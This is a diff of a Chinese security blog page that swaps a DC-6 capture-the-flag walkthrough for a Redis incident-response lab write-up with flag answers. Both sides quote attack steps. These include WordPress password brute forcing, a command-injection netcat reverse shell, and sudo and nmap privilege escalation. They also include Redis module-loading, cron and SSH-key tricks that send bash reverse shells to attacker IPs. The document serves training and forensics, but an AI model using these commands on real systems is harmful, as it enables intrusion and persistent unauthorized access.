@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>dc-6 | jujub3</title>
+    <title>日志分析-redis应急响应 | jujub3</title>
     <meta name="author" content="jujub3" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -156,14 +156,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>dc-6</h1>
+        <h1>日志分析-redis应急响应</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/4/4
+            2025/4/8
         </span>
         
         
@@ -175,8 +175,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/DC/" style="color: #ff7d73">
-                    DC
+                <a href="/tags/%E7%8E%84%E6%9C%BA/" style="color: #ffa2c4">
+                    玄机
                 </a>
             </span>
             
@@ -185,68 +185,69 @@
     </div>
     
     <div class="content" v-pre>
-        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><span id="more"></span>
+        <p>QAQ~</p>
+<span id="more"></span>
 
-<p><img src="/../dc-6/1735288296620-6e990584-3c1d-4e6b-b444-e8a8fe8548f8.png" alt="img"></p>
-<p>得到mac地址：00:0C:29:DD:F7:B0</p>
-<p>arp-scan -l，进行扫描</p>
-<p><img src="/../dc-6/1735288422237-9d4b6ec4-fc77-4153-b653-c73fdafc1a22.png" alt="img"></p>
-<p>得到ip地址为：192.168.3.57</p>
-<p>使用nmap进行端口扫描：</p>
-<p><img src="/../dc-6/1735288585150-aa6de545-c09f-472e-ae61-2ea79dac72f7.png" alt="img"></p>
-<p>开了80的http服务，访问的时候它会重定向到wordy，需要修改配置文件，加入：</p>
-<p>192.168.3.58 wordy</p>
-<p>windows：”C:\Windows\System32\drivers\etc\hosts”</p>
-<p><img src="/../dc-6/1735290524791-63970af8-6568-4646-a806-ba2f62745f1e.png" alt="img"></p>
-<p>linux：&#x2F;etc&#x2F;hosts</p>
-<p>然后dirsearch扫描，得到登录页面。</p>
-<p><img src="/../dc-6/1735291045419-ba54adda-9990-4f69-ac60-09547b387545.png" alt="img"></p>
-<p><img src="/../dc-6/1735291079765-17a28a86-62c4-4308-a04a-cdfe93746acd.png" alt="img"></p>
-<p>因为cms是wordpress，所以使用工具wpscan进行用户名扫描：</p>
-<p>wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy/</a> -e u </p>
-<p>最后发现了五个用户</p>
-<p><img src="/../dc-6/1735291378182-32bef40e-f22e-471b-9754-e8bab81e3ec9.png" alt="img"></p>
-<p>然后将其保存下来存入1.txt，接下来就是搞密码爆破了，但是并不能像dc-2那样使用cewl生成密码</p>
-<p>这里需要用到作者的提示，</p>
-<p><img src="/../dc-6/1735291764114-bb152dd6-748e-4522-9e6d-137439a343ec.png" alt="img"></p>
-<p>使用命令</p>
-<p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</p>
-<p><img src="/../dc-6/1735292310760-b7e90c40-c5b1-41e6-87a5-872fb6739a5f.png" alt="img"></p>
-<p>使用wpscan进行账号爆破：(注意目录位置）</p>
-<p>wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P passwords.txt</p>
-<p><img src="/../dc-6/1735292920681-6cfe98a7-c643-4ad9-a435-a28c0e5cd7cb.png" alt="img"></p>
-<p>最后成功扫出来一个账户：mark   helpdesk01	</p>
-<p>然后发现了一个注入点，利用  | 执行了我们的命令，直接反弹shell</p>
-<p><img src="/../dc-6/1735293950362-66677dca-63e3-4d0b-88bb-5f83977700af.png" alt="img"></p>
-<p>kali开启监听，然后执行命令：127.0.0.1|nc 192.168.3.9 8888 -e &#x2F;bin&#x2F;bash</p>
-<p><img src="/../dc-6/1735294128274-30b89321-5ced-4b26-9ab7-74ea6d9a461a.png" alt="img"></p>
-<p>执行交互式shell</p>
-<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
-<p>然后在mark的账户里看到了一个账号</p>
-<p><img src="/../dc-6/1735294473979-db6818d6-710f-4d0d-a888-057ee7ce0e20.png" alt="img"></p>
-<p>graham</p>
-<p>GSo7isUM1D4</p>
-<p>开始以为是wordpress，然后发现是ssh</p>
-<p><img src="/../dc-6/1735294786284-2858ae99-5c64-4a0b-82df-43e0c70ac954.png" alt="img"></p>
-<p>查看graham可用的sudo命令<img src="/../dc-6/1735294876969-7af9d8f6-179b-4e99-af0b-77258e70a295.png" alt="img"></p>
-<p>发现graham可以以jens的身份执行&#x2F;home&#x2F;jens&#x2F;backups.sh</p>
-<p>&gt;：覆盖文件内容</p>
-<p>&gt;&gt;：追加文件内容</p>
-<p>我们可以通过添加一个shell，然后执行这个文件</p>
-<p>追加一个shell：</p>
-<p>echo “&#x2F;bin&#x2F;bash” &gt; backups.sh</p>
-<p>然后以jens的身份执行这个文件：</p>
-<p> sudo -u jens .&#x2F;backups.sh  </p>
-<p>此时就拿到了jens的权限了：</p>
-<p><img src="/../dc-6/1735295405171-e2f4b21e-348a-4725-8287-e89fe9de9c9f.png" alt="img"></p>
-<p>然后查看jens可以执行的sudo命令（sudo提供的是root权限）</p>
-<p><img src="/../dc-6/1735295583400-3532b254-4a72-4bd7-bf27-956dc3b6f318.png" alt="img"></p>
-<p>使用nmap提权</p>
-<pre><code class="language-plain">echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; shell
-sudo  nmap  --script=shell
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>查看redis日志文件。注意到一个ip多次连接，很可疑。</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103548382-f7000f8a-b2ac-49e8-954a-6efd0bc65564.png" alt="img"><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103555618-0e3c59ec-c390-4a88-bee9-84022db33eef.png" alt="img"></p>
+<p>得到flag{192.168.100.13}</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p> 通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;  </p>
+<p>这里注意到加载了一个system模块。是从exp.so文件来的，很可能就是webshell</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103806981-59a3c213-7cab-432e-b834-8f37ec7993e3.png" alt="img"></p>
+<p>而且redis也有利用主从复制getshell的攻击手法</p>
+<pre><code class="language-plain">config set dir /tmp/ //设置文件路径为/tmp/
+config set dbfilename exp.so //设置数据库文件名为：exp.so
+slaveof vpsip port //设置主redis地址为 vpsip，端口为 port
+module load /tmp/exp.so
+system.exec &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
 </code></pre>
-<p>最后拿到flag（输入的命令不见了）</p>
-<p><img src="/../dc-6/1735295701462-9bf152a1-e028-4ace-96a2-822581bffa77.png" alt="img"></p>
+<p>首先连接靶机redis：redis-cli</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104158603-c7f51a08-cbd8-4d33-8ffa-e7587f1b0d5e.png" alt="img"></p>
+<p>然后下载这个exp.so文件，放到云沙箱中进行分析：</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104831855-a83472cb-f19a-41c7-92be-f79839eac002.png" alt="img"></p>
+<p>放进一个编辑器：找到flag：flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104958466-dcf997ac-082a-4780-86d4-318e895cfa73.png" alt="img"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p> 通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;  </p>
+<p>同样redis的攻击手法里有利用crontab写入定时任务来反弹shell的手法</p>
+<pre><code class="language-plain">redis-cli -h 192.168.100.13 #连接
+ 
+redis flushall #清除所有键值
+ 
+config set dir /var/spool/cron/crontabs/ #设置保存路径
+ 
+config set dbfilename shell #保存名称
+ 
+set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值
+ 
+save #写入保存路径的shell文件
+</code></pre>
+<p>分析主机的定时任务表就能发现反弹shell的情况了：crontab -l</p>
+<p> 这是因为攻击者可能会利用定时任务（cron jobs）来保持对系统的持久访问，或者定时反弹一个 Shell 到攻击者的机器  </p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105310803-2e86b15a-a103-4209-8573-027e210bcbb9.png" alt="img"></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p> 通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交  </p>
+<p>同样，redis的攻击手法中也有利用ssh-keygen 公钥登录服务器的方式</p>
+<p>当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，<br>在攻击机中申生成ssh公钥和私钥，密码设为空</p>
+<pre><code class="language-plain">ssh-keygen -t rsa
+进入.ssh目录:cd .ssh/ 将生成的公钥保存到1.txt
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt
+cat 1.txt | redis-cli -h [redis的ip] -x set crack
+redis-cli -h 192.168.157.129
+config set dir /root/.ssh       #	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）
+config set dbfilename authorized_keys  #设置上传公钥的备份文件名字为authorized_keys
+config get dbfilename #检查是否更改成功 
+save      #保存 
+exit       #退出
+ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机
+</code></pre>
+<p>也就是说会向靶机上写入ssh密钥，我们查看一下靶机的&#x2F;root&#x2F;.ssh,确实有一个被写入的公钥authorized_keys</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105584447-54b4717b-65ac-46d5-9c9c-255cad822358.png" alt="img">去github搜：flag{xj-test-user-wow-you-find-flag} </p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105871933-8f4c9bc8-e319-4fe1-b410-3a046fa2f009.png" alt="img"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p> 通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;  </p>
+<p>cd &#x2F;usr&#x2F;bin<br>ls -al</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744106137798-f7521e32-80ba-4f8d-868f-922fb4f3a828.png" alt="img"></p>
+<p>发现一个ps</p>
+<p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744106183514-c85c3863-240d-4b98-9c0c-390b3d0a3959.png" alt="img"></p>
+<p>flag{c195i2923381905517d818e313792d196}</p>
 
     </div>
     
